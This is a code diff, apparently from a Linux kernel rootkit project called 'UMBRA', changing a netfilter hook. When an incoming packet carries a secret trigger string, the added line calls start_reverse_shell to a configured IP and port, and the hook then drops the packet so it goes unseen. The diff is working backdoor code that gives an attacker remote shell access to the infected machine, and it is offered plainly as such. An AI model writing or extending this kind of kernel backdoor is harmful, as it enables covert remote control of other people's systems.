@@ -1,5 +1,6 @@
 #include "../include/netfilter_manager.h"
-
+#include "../include/utils.h"
+#include "../include/CONFIG.h"
 
 const char* UMBRA_BACKDOOR_KEY = "UMBRA_PAYLOAD_GET_REVERSE_SHELL";
 /**
@@ -82,15 +83,14 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
         if(memcmp(user_data, UMBRA_BACKDOOR_KEY, strlen(UMBRA_BACKDOOR_KEY))==0){
             //Packet had the secret payload.
             printk(KERN_INFO "UMBRA:: Received backdoor packet \n");
-            //kfree(data);
+            //kfree(_data);
+            start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
             return NF_DROP;
         }
 
 
         return NF_ACCEPT;
-        //printk(KERN_INFO "UMBRA:: Received backdoor packet with data %s\n", user_data);
-        
-        //return NF_DROP;
+
     }
     return NF_ACCEPT;
 
